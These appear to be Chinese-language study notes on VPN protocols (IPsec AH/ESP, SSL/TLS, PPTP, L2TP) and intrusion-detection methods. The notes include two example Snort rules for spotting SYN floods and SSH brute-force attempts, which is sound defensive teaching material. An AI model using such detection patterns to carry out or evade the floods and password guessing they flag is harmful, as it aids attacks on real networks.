SKIP 互联网简单密钥管理协议
ISAKMP/Oakley 互联网安全联盟和密钥管理协议

### 认证访问控制
#### 用户身份认证
服务器对请求连接的VPN客户机进行身份验证，或双向身份验证。
#### 数据完整性和合法性认证

#### VPN的访问控制方法
##### 基于角色的访问控制 (RBAC)：

根据用户的角色分配访问权限，确保不同角色的用户只能访问其职能范围内的资源。

##### 基于属性的访问控制 (ABAC)：

根据用户属性、资源属性和环境属性进行访问控制决策。例如，根据用户的部门、职位、工作时间等决定访问权限。
缺点：实现和管理复杂，需要准确定义和更新属性和策略。

##### 基于策略的访问控制 (PBAC)：

使用策略语言（如XACML）定义和管理访问控制策略，根据策略进行动态访问控制。

##### 网络访问控制 (NAC)：

结合设备的安全状态（如防病毒软件、操作系统补丁）进行访问控制，确保只有符合安全标准的设备可以连接VPN。

优点：提高网络安全性，防止不安全设备接入。
缺点：需要额外的设备和软件支持，管理复杂。

##### 多因素访问控制 (MFAC)：


### IPSec
Internet Protocol Security  
#### IPsec的主要组件：

##### 安全协议：

- AH（Authentication Header）：提供数据完整性和源认证，但不提供加密。
- ESP（Encapsulating Security Payload）：提供数据加密、数据完整性和源认证。

##### 安全关联（SA，Security Association）：

定义了一组参数（如加密算法、密钥）用于在两个设备之间建立和维护安全通信。

##### 密钥管理协议：

- IKE（Internet Key Exchange）：用于协商、建立和维护SA，包括生成和交换加密密钥。

#### IP AH
IP AH是一种*安全协议*，目的是*保证IP包的完整性和提供数据源认证*，为IP数据报文提供无连接的完整性、数据源鉴别和抗重放攻击服务。**不提供数据加密**。

AH 的主要功能是计算并验证数据包的完整性检查值（ICV, Integrity Check Value），ICV 是一个哈希值，用于确保数据包在传输过程中未被篡改。
AH 使用哈希函数和消息认证码 (MAC) 来生成 ICV。
- SHA-2 (Secure Hash Algorithm 2)：包括 SHA-256、SHA-384 和 SHA-512，生成 256 位、384 位和 512 位哈希值。
- HMAC (Hash-based Message Authentication Code)：结合哈希函数和密钥生成消息认证码。

##### ICV 的计算：

- 初始化：

选择一个合适的哈希算法，如 HMAC-SHA-256。
设定安全参数索引 (SPI)、序列号等其他 AH 头部字段。

- 数据包预处理：

复制原始数据包，准备计算 ICV。
将 AH 头部中的 Authentication Data 字段（ICV 字段）填充为零。

- 计算哈希输入数据：

将 IP 头部和有效载荷部分（包括嵌入的 AH 头部）拼接在一起，形成哈希输入数据。
对于 IPv4 数据包，以下字段在计算时视为零：
IP 头部的可变字段（如生存时间 (TTL)、头部校验和等）。
AH 头部中的 Authentication Data 字段。

- 计算哈希值：

使用 HMAC 结合共享密钥和预处理后的数据包计算哈希值。具体步骤如下：
内部哈希函数：H(K XOR ipad || data)，其中 K 是密钥，ipad 是内置填充值。
外部哈希函数：H(K XOR opad || 内部哈希结果)，其中 opad 是外置填充值。

- 生成 ICV：

截取哈希值的前 N 位作为 ICV，N 取决于所选的哈希算法（如 HMAC-SHA-256 的 N 为 256 位）。
将生成的 ICV 填入 AH 头部的 Authentication Data 字段。

##### AH 头部结构
AH 头部包含以下字段：

- Next Header：指示下一个头部的类型（如 TCP、UDP 等）。
- Payload Length：AH 头部的长度。
- Reserved：保留字段，通常设为 0。
- Security Parameters Index (SPI)：标识安全关联（SA）。
- Sequence Number：用于防重放攻击的序列号。
- Authentication Data：ICV，包含计算出的哈希值或消息认证码。

##### ICV 计算示例
假设使用 HMAC-SHA-256 作为哈希算法，计算 ICV 的具体步骤如下：

- 选择密钥：假设共享密钥为 K。
- 构建数据包：将 IP 头部、AH 头部和有效载荷部分拼接成一个整体，填充 AH 头部中的 Authentication Data 字段为零。
- 计算哈希值：
内部哈希：H(K XOR ipad || data)。
外部哈希：H(K XOR opad || 内部哈希结果)。
截取哈希值前 256 位 作为 ICV。
- 填充 ICV：将生成的 ICV 填入 AH 头部的 Authentication Data 字段。
##### ICV 验证
接收方验证 ICV 的步骤与发送方的计算过程类似：

- 接收数据包：提取 IP 头部、AH 头部和有效载荷部分。
- 提取 ICV：从 AH 头部的 Authentication Data 字段中提取接收到的 ICV。
- 计算哈希值：
将 Authentication Data 字段填充为零。
使用共享密钥和预处理后的数据包计算哈希值。
- 比较 ICV：将计算出的 ICV 与接收到的 ICV 进行比较。如果匹配，则数据包验证通过，否则丢弃数据包。

##### 结构图
- 完整的IP包：
```css
+----------------+--------------+----------------------+
| IPv4 Header    | Auth Header  | Upper Protocol       |
|                | (with ICV)   | (e.g., TCP, UDP)     |
+----------------+--------------+----------------------+

```

- AH头部：
```css
0                   1                   2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-------------------------------+-------------------------------+
| Next Header  | Payload Length |          Reserved             |
+-------------------------------+-------------------------------+
|                         Security Parameters Index (SPI)       |
+---------------------------------------------------------------+
|                      Sequence Number Field                    |
+---------------------------------------------------------------+
|                                                               |
|                      Authentication Data (ICV)                |
|                                                               |
|                                                               |
+---------------------------------------------------------------+

```

### IP ESP
Encapsulating Security Payload
ESP 提供了数据加密以及数据完整性和身份验证。（IP AH没有IP包的保密性服务）
AH和ESP可以合用也可以分用。

#### ESP流程：
1. 加密数据：

发送方使用共享密钥对数据包的有效载荷进行加密，包括原始的 IP 数据包的内容（但不包括 IP 头部）。

2. 计算 ICV：

发送方使用哈希算法（如 HMAC-SHA-256）结合共享密钥计算数据包的完整性检查值 (ICV)，并将其附加到 ESP 头部。

3. 封装数据包：

发送方将加密后的有效载荷、ESP 头部和 ICV 拼接在一起，形成最终的 ESP 数据包。

4. 发送数据包：

发送方将 ESP 数据包发送到接收方。

5. 解密数据：

接收方接收到 ESP 数据包后，使用共享密钥对加密的有效载荷进行解密，恢复原始数据。

6. 验证 ICV：

接收方使用相同的哈希算法和共享密钥计算接收到的数据包的 ICV，并与接收到的 ICV 进行比较。如果匹配，则数据包验证通过，否则丢弃数据包。

#### ESP结构
```css
0                   1                   2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+---------------------------------------------------------------+
|                  Security Parameters Index (SPI)              |
+---------------------------------------------------------------+
|                      Sequence Number                          |
+---------------------------------------------------------------+
|                      Payload Data                             |
~                                                               ~
|                                                               |
+---------------------------------------------------------------+
|             Padding (0-255 bytes)                             |
+---------------------------------------------------------------+
|             Pad Length     | Next Header                      |
+---------------------------------------------------------------+
|                      Integrity Check Value (ICV)              |
~                                                               ~
+---------------------------------------------------------------+

```

多了Payload Data、Padding、Pad Length。

- Security Parameters Index (SPI)：

32 位字段，用于标识安全关联（SA）。

- Sequence Number：

32 位字段，用于防止重放攻击的序列号，每发送一个新的数据包递增。

- Payload Data：

加密后的数据部分，包含原始的IP数据包的有效载荷（例如 TCP、UDP 数据）。

- Padding：

用于填充以确保加密算法的块大小对齐，以及隐藏数据包的真实长度。

- Pad Length：

8 位字段，指示填充的长度。

- Next Header：

8 位字段，指示下一个头部的类型（例如 TCP、UDP）。

- Integrity Check Value (ICV)：

可变长度，包含计算出的哈希值或消息认证码，用于数据包的完整性检查和源身份验证。

8.6
---
### 工作模式
#### 传输模式 Transport Mode
主机到主机的通信，两个设备之间。  
在传输模式下，仅对IP包的有效载荷部分进行加密/认证，不对IP头进行保护。
##### AH 在传输模式下的工作
AH 在传输模式下对整个 IP 数据包（包括 IP 头部和有效载荷）进行数据完整性和身份验证，但不加密数据。  
在计算 AH 的 ICV（完整性检查值）时，IP 头部中的可变字段（如 TTL 和头部校验和）设为零。
```css
+------------------+---------------+------------------+
| Original IP Header | AH Header | Upper Layer Data |
+------------------+---------------+------------------+
```

##### ESP 在传输模式下的工作
ESP 在传输模式下对 IP 数据包的有效载荷部分进行加密和/或数据完整性和身份验证，而 IP 头部保持不变。  
数据加密和完整性检查（ICV）在传输模式下仅针对有效载荷部分。
```css
+------------------+---------------+------------------+---------------+
| Original IP Header | ESP Header | Encrypted Payload | ESP Trailer (Pad, Len, Next) | ESP Auth (ICV) |
+------------------+---------------+------------------+---------------+
```

#### 隧道模式 Tunnel Mode

主要用于网络到网络（两个子网之间）、主机到网络的通信。  
在隧道模式下，对整个 IP 数据包（包括原始 IP 头部和有效载荷）进行保护，并封装在一个新的 IP 数据包中。

##### AH 在隧道模式下的工作
AH 在隧道模式下对整个原始 IP 数据包进行完整性和身份验证，并添加一个新的外部 IP 头部。
在计算 AH 的 ICV 时，原始 IP 头部和有效载荷都包含在内，但外部 IP 头部中的可变字段设为零。
```css
+------------------+------------------+---------------+------------------+
| New IP Header | AH Header | Original IP Header | Upper Layer Data |
+------------------+------------------+---------------+------------------+
```
##### ESP 在隧道模式下的工作
ESP 在隧道模式下对整个原始 IP 数据包进行加密和/或数据完整性和身份验证，并封装在一个新的外部 IP 数据包中。
数据加密和完整性检查（ICV）在隧道模式下针对整个封装后的数据包。
```css
+------------------+---------------+------------------+------------------+---------------+
| New IP Header | ESP Header | Original IP Header | Encrypted Payload | ESP Trailer (Pad, Len, Next) | ESP Auth (ICV) |
+------------------+---------------+------------------+------------------+---------------+
```

#### 密钥交换协议
建立安全关联的方法可以是手工/自动的。
- 手工配置的话，双方事先对AH的安全密钥、ESP的安全密钥等参数达成一致，然后分别写入双方数据库中。
- 自动配置就是双方的安全关联的各种参数由KDC（Key Distributed Center）和通信双方共同商定。相关密钥管理协议主要由IKE（Internet Key Exchange）、ISAKMP、Oakley。（？）
>IKE 的应用示例:
假设我们需要配置一个基于 IKEv2 的 IPsec VPN，以下是基本步骤：
配置 IKE_SA_INIT：
配置加密和认证算法，如 AES、SHA-256。
进行 Diffie-Hellman 密钥交换。
配置 IKE_AUTH：
配置身份验证方法，如预共享密钥或数字证书。
建立第一个 Child SA。
配置和管理 Child SA：
配置加密和认证算法，用于实际的数据传输。
创建和更新多个 Child SA，保护数据通信。


### SSL
Secure Sockets Layer
多被TLS, Transport Layer Security所取代。
SSL/TLS协议的主要目标是为应用层协议（如HTTP、FTP、SMTP等）提供安全传输，用于构建客户端和服务端之间的安全通道。
- 介于应用层和TCP层之间。

#### 组成部分
SSL/TLS协议由以下几个子协议组成：

- 记录协议（Record Protocol）：负责分块、压缩、加密和传输数据。
- 握手协议（Handshake Protocol）：负责协商加密算法、认证对方身份和交换密钥。
- 警报协议（Alert Protocol）：用于传递错误和警报信息。
- 更改密码规范协议（Change Cipher Spec Protocol）：通知对方加密算法和密钥的变更。
- 应用数据协议（Application Data Protocol）：传输应用层数据。


#### SSL握手流程

```diff
客户端                                      服务器
  |                                          |
  |----ClientHello-------------------------->|
  |                                          |
  |<----ServerHello--------------------------|
  |<----Server Certificate-------------------|
  |<----Server Key Exchange (if needed)------|
  |<----ServerHelloDone----------------------|
  |                                          |
  |----Client Certificate (if requested)---->|
  |----Client Key Exchange------------------->|
  |----Certificate Verify (if needed)-------->|
  |----ChangeCipherSpec---------------------->|
  |----Finished------------------------------>|
  |                                          |
  |<----ChangeCipherSpec----------------------|
  |<----Finished------------------------------|
  |                                          |
```
- ClientHello：

客户端发送一个`ClientHello`消息，包含*支持的SSL/TLS版本、加密套件列表、压缩方法和随机数*。

- ServerHello：

服务器响应ClientHello，发送一个`ServerHello`消息，包含选择的SSL/TLS版本、加密套件、压缩方法和随机数（用于生成会话密钥）。

- 服务器证书：

服务器发送其数字证书，用于客户端验证服务器的身份。证书中包含服务器的公钥。

- 服务器密钥交换（if needed）：

如果选择的加密套件需要密钥交换，服务器发送密钥交换信息。比如，使用Diffie-Hellman算法时，服务器会发送Diffie-Hellman参数。

- ServerHelloDone：

服务器发送`ServerHelloDone`消息，表示服务器Hello阶段完成。

- 客户端证书（if needed）：

如果服务器需要客户端认证，客户端发送其数字证书。

- 客户端密钥交换：

客户端生成一个预主密钥（Pre-Master Secret），使用服务器的公钥加密并发送给服务器。服务器使用其私钥解密得到预主密钥。

- 客户端验证（if needed）：

如果使用客户端证书，客户端发送一个签名的哈希值，以供服务器验证客户端的身份。

- 更改密码规范：

客户端和服务器都发送`ChangeCipherSpec`消息，表示后续的通信将使用协商好的加密算法和密钥。

- 完成握手：

客户端和服务器发送`Finished`消息，包含所有握手消息的哈希值，以供对方验证握手的完整性。此时，握手过程完成，客户端和服务器开始使用加密通信。


#### SSL分层
SSL是一个分层协议。
- 最底层是SSL记录协议SSL Record Protocol。用途是将高层协议（HTTP，SSL握手）封装后再传送。
    - 工作流程
        - 分块：将应用层数据分成可管理的块（通常最大为 16KB）。
        - 压缩：可选步骤，压缩数据以减少传输量。
        - 添加 MAC：计算并附加消息认证码（MAC），用于数据完整性检查。
        - 加密：使用协商好的对称密钥对数据块进行加密，确保数据机密性。
        - 封装：将加密后的数据块封装在记录协议的帧结构中。
        - 接收端将收到的消息解密、验证、解压缩，再重组后传达至应用层。


- 握手层 Handshake Layer。
这一层包含了用于建立和维护安全连接的多个子协议。

    - 握手协议（Handshake Protocol）：
        - 功能：协商加密算法、交换密钥和认证身份。
        - 过程：包括ClientHello、ServerHello、证书交换、密钥交换、ChangeCipherSpec和Finished等消息。

    - 警报协议（Alert Protocol）：
        - 功能：传递错误和警报信息。

    - 更改密码规范协议（Change Cipher Spec Protocol）：
        - 功能：通知对方后续通信将使用新的加密参数。

之后就是应用层协议HTTP,FTP,SMTP等。

#### SSL协议组成示意图
```css
Application Layer (HTTP, FTP, SMTP ...)
+--------------------------------------------------------------+
|                       SSL/TLS Protocols                      |
+---------------------+-------------------+--------------------+
| SSL Handshake       | SSL Change Cipher | SSL Alert Protocol |
| Protocol            | Spec. Protocol    |                    |
+---------------------+-------------------+--------------------+
|                         SSL Record Protocol                  |
+--------------------------------------------------------------+
Transport Layer (TCP/UDP)
+--------------------------------------------------------------+
Network Layer (IP)
+--------------------------------------------------------------+
Data Link Layer
+--------------------------------------------------------------+
Physical Layer
+--------------------------------------------------------------+
```

### PPTP
Point-to-Point Tunneling Protocol
是一种用于在公用网络（如互联网）上创建虚拟专用网络（VPN）连接的协议。PPTP通过在IP网络上封装PPP（Point-to-Point Protocol）帧，提供了一种简便的VPN实现方式。

#### 工作原理
PPTP使用控制连接和数据隧道两部分来实现VPN功能。

1. 控制连接
- 使用协议：PPTP使用TCP协议（通常是1723端口）来建立控制连接。
- 功能：控制连接用于传输控制消息，例如建立和维护PPTP隧道，以及PPP会话的配置。
2. 数据隧道
- 使用协议：PPTP使用GRE（Generic Routing Encapsulation）协议来封装PPP帧。
- 功能：数据隧道用于传输实际的用户数据。

#### 缺点
PPTP的安全性较弱，容易受到多种攻击，如MS-CHAPv2被证明存在弱点，容易被暴力破解。  
PPTP本身不提供数据加密。  
PPTP使用GRE协议，某些防火墙和NAT设备可能不支持或阻挡GRE流量，影响连接稳定性。  

在需要快速、简便的VPN解决方案且安全性要求不高的场景中，PPTP仍然是一种可选方案。如远程办公：企业员工通过PPTP VPN远程访问公司内部网络资源。

### L2TP
Layer 2 Tunneling Protocol，第二层隧道协议。用于保护设置L2TP-enabled的客户端和服务端通信。  
它结合了L2F（Layer 2 Forwarding Protocol）和PPTP（Point-to-Point Tunneling Protocol）.  
由于L2TP本身不提供加密，通常与IPsec结合使用（称为L2TP/IPsec）。如下：  
- IPsec隧道建立
在L2TP隧道建立之前，首先通过IPsec协议（通常是IKE）建立一个安全的IPsec隧道。
IPsec提供加密和身份验证，确保数据在传输过程中不被窃听或篡改。
- L2TP隧道建立
在IPsec隧道内，通过UDP端口1701建立L2TP隧道。
L2TP隧道在IPsec隧道的保护下，传输PPP帧和用户数据。


8.9
---
todo:
wireshark:
ip.addr ==183.95.190.223
访问www.chutianyun.gov.cn

三次握手的时候
Client Hello和Server Hello中，TLS的版本



## VPN主要产品和技术指标
### 主要产品
#### IPSec VPN
工作模式支持隧道模式和传输模式。

#### SSL VPN
工作模式分为客户端-服务端，网关-网关。

### VPN产品主要技术指标
《IPSec VPN 技术规范》、
《SSL VPN技术规范》

#### 密码算法要求
##### IPSec VPN算法使用方法如下：
非对称：1024bits的RSA、256bits的SM2 ECC。
对称：128bis分组的SM1 CBC。
杂凑算法：SHA-1/SM3的Hash算法，SM3输出为256bits。
随机数生成算法：《随机性检测规范》

##### SSL VPN算法使用如下：
非对称：256bits群阶ECC SM2，IBC标识密码算法SM9，1024+bits RSA.
分组密码：SM1，CBC。
杂凑算法：SM3，SHA-1。

##### SM9 IBC
Identity-Based Cryptography
- 基于身份的加密: 在SM9中，用户的公钥是由其身份信息（如用户的唯一标识符）和系统参数生成的。系统主私钥由一个可信的第三方（称为密钥生成中心，KGC）管理。
- 密钥生成中心（KGC）: KGC生成系统的主私钥，并根据用户的身份生成相应的私钥。用户使用这个私钥进行解密和签名操作。
- 主要操作
    - 公钥生成: 用户的公钥由其身份信息和系统主公钥生成，不需要用户自己生成或管理公钥。
    - 私钥分发: KGC根据用户的身份信息生成并分发私钥，用户使用这个私钥执行加密或签名操作。
    - 加密和解密: 发送方使用接收方的身份信息生成接收方的公钥，并使用该公钥加密消息。接收方使用KGC分发给它的私钥进行解密。
    - 签名和验证: 签名者使用自己的私钥对消息进行签名，验证者使用签名者的身份生成公钥并验证签名的有效性。

#### VPN产品功能要求
##### IPSec VPN
随机数生成、密钥协商、安全报文封装、NAT穿越、身份鉴别（支持数字证书/公司密钥对）。
##### SSL VPN
随机数生成、密钥协商、安全报文传输、身份鉴别、访问控制、密钥更新、客户端主机安全检查。

#### VPN产品性能要求
- IPSec VPN主要性能指标：
##### 加解密吞吐率
分别在64字节以太帧长和1428字节以太帧长时，IPSec VPN产品在丢包率为0的条件下，内网口上达到了**双向数据最大流量**。

##### 加解密时延
分别在64字节以太帧长和1428字节以太帧长时，IPSec VPN产品在丢包率为0的条件下，**一个明文数据流经加密变为密文，再由密文解密还原为明文所消耗的平均时间。**

##### 加解密丢包率
加解密丢包率是指分别在64字节以太帧长和1428字节（IPv6是1408字节）以太帧长时，在IPSec VPN产品内处于丢线速情况下，**单位时间内错误或丢失的数据包占总发送数据包数量的百分比**。

##### 每秒新建连接数
每秒新建连接数是指IPSec VPN产品**在一秒钟的时间单位内能够建立隧道数目的最大值**。

- SSL VPN主要性能指标：
##### 最大并发用户数
同时在线用户的最大数目。此指标反映产品能够同时提供服务的最大用户数量。
##### 最大并发连接数
同时在线SSL连接的最大数目，此指标反映产品能够同时处理的最大SSL连接数量。
##### 每秒新建连接数
每秒钟可以新建的最大SSL连接数目，此指标反映产品每秒能够接入新SSL连接的能力。
##### 吞吐率
在丢包率为0的条件下，服务端产品在内网口上达到的双向数据最大流量。

## VPN技术应用
### VPN应用场景
- 远程访问虚拟网 Access VPN
- 企业内部虚拟网 Intranet VPN
- 企业扩展虚拟网 Extranet VPN

### 远程安全访问
利用VPN技术，通过拨号、ISDN等方式接入公司内部网。Access VPN一般包含两部分，远程用户VPN客户端软件和VPN接入设备。

### 内部安全专网
Intranet VPN通过公用网络，把分散在不同地理区域的企业办公点的局域网安全互联起来。

### 外部网络安全互联
Extranet VPN利用VPN技术，在公共通信基础设施上把合作伙伴的网络或主机安全接到企业内部网。解决企业外部机构介入安全和通信安全问题。

## 本章小结
VPN的基本概念和功能，关键技术、重要协议、技术规范，三种应用参考案例。

# 第10章 入侵检测技术原理与应用
## 概述
### 入侵检测概念
Intrusion Detection
入侵是指违背访问目标的安全策略的行为。  
入侵检测是一种用于监视网络或系统中恶意活动的技术和方法。通过收集操作系统、系统程序、应用程序、网络包等信息，复现系统中违背安全策略或危及系统安全的行为。

### 入侵检测模型
- 早期模型：主体 与 客体 之间的交互通过 安全监控器 进行监控。
安全监控器 收集 审计数据 并生成 系统轮廓。
系统轮廓会根据 规则匹配 分析，确定是否存在 攻击状态。
根据检测到的行为，系统会 添加新规则 或 更新规则，以提高检测的准确性和适应性。

面对长期准备的攻击，入侵检测系统的不同功能组件之间，不同 IDS 之间共享这些攻击信息是十分重要的。

#### CIDF
Common Intrusion Detection Framework  
该模型认为入侵检测系统由事件**产生器（event generators）、事件分析器（event analyzers）、响应单元（response units）和事件数据库（event databases）** 组成。

- 事件：需要分析的数据。可以是网络中的数据包，也可以是从系统日志等途径得到的信息。
- 事件产生器（E-boxes） 从计算环境中获取事件，并向系统的其他部分提供事件。
- 事件分析器（A-boxes） 分析事件产生器提供的数据，并生成分析结果。
- 响应单元（R-boxes） 对分析结果做出反应，例如断网、改变文件属性、简报警等应急响应。
- 事件数据库（D-boxes） 用于存储和管理事件分析结果，支持不同数据类型的存储和查询，具有很强的扩展性。

### 入侵检测作用
发现受保护系统中的入侵行为或异常行为；
检验安全保护措施的有效性；
分析受保护系统所面临的威胁；
有利于阻止安全事件扩大，及时报警触发网络安全应急响应；
可以为网络安全策略的制定提供重要指导；
报警信息可用作网络犯罪取证。

## 入侵检测技术
### 基于误用的入侵检测技术（基于特征）
指根据已知的入侵模式检测入侵行为。
原理：攻击者的行为会与 攻击模式库 进行比对。
如果匹配成功，则系统发出 报警，表示检测到入侵行为。
**误用入侵检测依赖于攻击模式库**。采用误用入侵检测技术的 IDS 产品的检测能力就取决于**攻击模式库的大小以及攻击方法的覆盖面**。如果攻击模式库太小，则 IDS 的有效性就大打折扣。而如果攻击模式库过大，则 IDS 的性能会受到影响。

误用入侵检测的前提条件是，入侵行为能够按某种方式进行特征编码，而入侵检测的过程实际上就是模式匹配的过程。

#### 基于条件概率的误用检测方法

先验概率 是在统计学和概率论中的一个重要概念，它表示在考虑新的证据或数据之前，对某个事件发生的初步估计或相信的程度。比如根据历史数据或统计模型。

基于条件概率的误用检测方法，是将入侵方式对应一个事件序列，然后观察事件发生序列，应用贝叶斯定理进行推理，推测入侵行为。


令 \(ES\) 表示某个事件序列，发生入侵的先验概率为 \(P(\text{Intrusion})\)，发生入侵时该事件序列 \(ES\) 出现的后验概率为 \(P(ES \mid \text{Intrusion})\)，该事件序列出现的概率为 \(P(ES)\)，则有：

\[
P(\text{Intrusion} \mid ES) = P(ES \mid \text{Intrusion}) \times \frac{P(\text{Intrusion})}{P(ES)}
\]
它告诉我们在观察到事件序列 \(ES\) 之后，系统被入侵的概率是多少。它直接指示了某个事件序列是否与入侵相关。

通常网络安全员可以给出先验概率 \(P(\text{Intrusion})\)，对入侵报告进行数据统计处理可得 \(P(ES \mid \neg \text{Intrusion})\) 和 \(P(ES \mid \text{Intrusion})\)，于是可以计算出：

\[
P(ES) = [P(ES \mid \text{Intrusion}) - P(ES \mid \neg \text{Intrusion})] \times P(\text{Intrusion}) + P(ES \mid \neg \text{Intrusion})
\]

公式中的 \( P(ES) \) 表示事件序列 \( ES \) 发生的总体概率，而公式的右侧结合了系统在入侵和非入侵情况下的条件概率，以及系统被入侵的先验概率。

先看最后加法的一项，\( P(ES \mid \neg Intrusion) \) 代表了在系统未被入侵的情况下，事件序列 \( ES \) 发生的概率。它的引入意味着我们需要考虑事件序列在正常操作条件下的自然发生率，而不仅仅是在入侵条件下。从实际意义上来看，这是需要考虑的一项因素。

公式的括号部分 \( [P(ES \mid Intrusion) - P(ES \mid \neg Intrusion)] \) 表示入侵和非入侵情况下该事件序列发生概率的差异。如果入侵条件下的事件序列发生概率远高于非入侵条件下的概率，这个差异将很大，表明事件序列更可能与入侵相关。

将括号部分乘以先验概率 \( P(Intrusion) \) ，表明这种差异发生的可能性还取决于系统被入侵的初始可能性。



如果我们将原公式中的括号展开，公式变为：

\[
P(ES) = P(ES \mid Intrusion) \times P(Intrusion) + P(ES \mid \neg Intrusion) \times P(\neg Intrusion)
\]

这其实是一个全概率公式，它表示在考虑所有可能性时，事件序列 \( ES \) 发生的总体概率。这是对所有可能性加权后的结果。

##### 补充：先验&后验
1. 先验概率（Prior Probability）
先验概率 是在没有观察到当前数据之前，根据已有的知识、经验或历史数据对某个事件发生概率的估计。在贝叶斯公式中，先验概率代表我们对某个事件（如系统被入侵）的初步判断。
2. 后验概率（Posterior Probability）
后验概率 是在观察到新的数据或证据之后，更新了的概率估计。在贝叶斯推理中，后验概率是通过结合先验概率和新的证据（如观察到的事件序列 \(ES\)来计算的。

贝叶斯定理公式如下：

\[
P(Intrusion \mid ES) = \frac{P(ES \mid Intrusion) \times P(Intrusion)}{P(ES)}
\]

这里：

- \( P(Intrusion \mid ES) \) 是 **后验概率**，表示在观察到 \( ES \) 之后，系统被入侵的概率。
- \( P(Intrusion) \) 是 **先验概率**，表示在没有观察到 \( ES \) 之前，系统被入侵的初步概率。
- \( P(ES \mid Intrusion) \) 是 **似然函数**，表示在系统被入侵的情况下，观察到事件序列 \( ES \) 的概率。
- \( P(ES) \) 是 **边际似然**，表示在所有可能的情况下，事件序列 \( ES \) 发生的概率。




#### 基于状态迁移的误用检测方法
基于状态迁移的误用检测方法主要通过分析系统状态的变化来检测入侵行为。状态迁移方法利用状态图表示攻击特征，不同状态刻画了系统某一时刻的特征。初始状态对应于入侵开始前的系统状态，危险状态对应于已成功入侵时刻的系统状态。初始状态与危险状态之间的迁移可能有一个或多个中间状态。
基于状态迁移的误用检测方法通过检查系统的状态变化发现系统中的入侵行为。采用该方法的 IDS 有 STAT（State Transition Analysis Technique）和 USTAT（State Transition Analysis Tool for UNIX）。

- 优点：
能够识别复杂攻击路径：通过跟踪状态迁移过程，可以发现需要多步操作才能完成的复杂攻击。
- 问题：
对未定义的状态迁移路径不敏感：如果攻击行为使用了一条没有被事先定义的路径，那么系统可能无法检测到。
状态定义和分析较为复杂：系统的每一个可能状态都需要被明确定义，并且在实际应用中，系统可能存在大量的状态和迁移路径，增加了分析的难度。

#### 基于键盘监控的误用检测方法
假设入侵行为对应特定的击键序列模式，然后监测用户的击键模式，并将这一模式与入侵模式匹配，从而发现入侵行为。入侵者可能在尝试绕过安全机制时，输入一系列常见的命令。
如果没有击键语义分析，用户使用别名（例如 Korn shell）很容易欺骗这种检测技术。

#### 基于规则的误用检测方法
将攻击行为或入侵模式表示成一种规则，只要符合规则就认定它是一种入侵行为。

这些规则通常描述了攻击者在尝试入侵系统时的典型行为模式，例如某种特定的数据包序列、特定命令的执行等。

Snort 是典型的基于规则的误用检测方法的应用实例。Snort 是一种开源的网络入侵检测系统，广泛使用基于规则的误用检测方法。

Snort开源找到的例子：
`https://github.com/snort3/snort3`
##### 检测TCP SYN Flood攻击
向目标服务器发送大量的TCP SYN请求而不完成三次握手.
```bash
alert tcp any any -> $HOME_NET 80 (msg:"Possible TCP SYN Flood"; flags:S; threshold:type both, track by_src, count 20, seconds 10; sid:1000001;)
```
- `alert tcp any any -> $HOME_NET 80`：这一部分定义了规则的基本匹配条件。它表示，当任何来源 (any) 的任何端口 (any) 发送 TCP 数据包到 `$HOME_NET`（内部网络）中的端口80（通常是HTTP服务）时，规则将被触发。

- `msg:"Possible TCP SYN Flood"`：这是当规则匹配时生成的警报信息，表示可能存在 TCP SYN Flood 攻击。

- `flags:S`：这是一个标志位条件，表示检测带有 SYN 标志的 TCP 数据包。

- `threshold:type both, track by_src, count 20, seconds 10`：这是一个阈值设置，表示在10秒内如果同一来源的IP地址发送超过20个带有 SYN 标志的数据包，将触发报警。

- `sid:1000001;`：这是规则的唯一标识符（Snort ID），用于区分不同的规则。

##### 检测用户登录失败次数过多
设置一个规则来检测某个用户在短时间内多次失败登录的情况，这可能是暴力破解密码的表现。

```bash
alert tcp any any -> $HOME_NET 22 (msg:"Possible SSH Brute Force Attempt"; content:"Failed password"; nocase; threshold:type both, track by_src, count 5, seconds 60; sid:1000002;)
```
- `alert tcp any any -> $HOME_NET 22`：规则匹配任何源发送到 $HOME_NET（内部网络）中22端口（SSH服务）的TCP数据包。
- `msg:"Possible SSH Brute Force Attempt"`：匹配后触发的报警信息，表示可能存在SSH暴力破解尝试。
- `content:"Failed password"; nocase;`：规则会在数据包中查找"Failed password"的文本字符串，nocase表示忽略大小写。
- `threshold:type both, track by_src, count 5, seconds 60`：设置了一个阈值，表示如果在60秒内，同一来源的IP地址发送了5次失败的密码尝试，将触发报警。
- `sid:1000002;`：规则的唯一标识符。

8.15
---

### 基于异常的入侵检测技术
异常检测方法是指通过计算机或网络资源统计分析，建立系统正常行为的“轨迹”，定义一组系统正常情况下的数值，然后将系统运行时的数值与所定义的“正常”情况相比较，得出是否有被攻击的迹象。

这个数据可以包括多个维度，如：
- 命令调用频率：系统中各类命令被调用的频率。
- 系统调用模式：系统调用的顺序和频率。
- 应用类型：系统中常用的应用程序及其使用情况。
- 活动度量：网络中数据包的流量、连接数等。
- CPU使用率：系统资源的占用情况。
- 网络连接：网络中建立的连接及其流量。

异常检测的前提是异常行为包括入侵行为。理想情况下，异常行为集合等同于入侵行为集合。但是在现实中，入侵行为集合通常不等同于异常行为集合。事实上，具体的行为有 4 种情况：

行为是入侵行为，但不表现异常；
行为不是入侵行为，却表现异常；
行为既不是入侵行为，也不表现异常；
行为是入侵行为，且表现异常。

#### 基于统计的异常检测方法
基于统计的异常检测方法就是利用数学统计理论技术，通过构建用户或系统正常行为的特征轮廓。其中统计性特征轮廓通常由主体特征变量的**频度、均值、方差、被监控行为的属性变量**的统计概率分布以及偏差等统计量来描述。

典型的系统主体特征有：系统的登录与注销时间，资源被占用的时间以及处理机、内存和外设的使用情况等。
周期几分钟到几个月。

#### 基于模式预测的异常检测方法
一种基于时间的推理方法，利用时间规则识别用户正常行为模式的特征。
通过归纳学习产生这些规则集，并能动态地修改系统中的这些规则。
如果规则的大部分时间是正确的，并能够成功地用于预测所观察到的数据，那么规则就是具有较高的可信度。
TIM（Time-based Inductive Machine）给出规则：
\[
(E1 \! E2 \! E3)(E4 = 95\%, E5 = 5\%)
\]
`!`用于表示事件的顺序，`E4 = 95%` 和 `E5 = 5%` 表示事件发生的概率。
E1👉E2👉E3表示这些事件按照特定的顺序发生。  

如果观察到的事件序列匹配规则的左边，而后续的事件显著地背离规则预测到的事件，那么系统可以检测出这种偏离，表明用户操作异常。

这种方法的主要优点有：
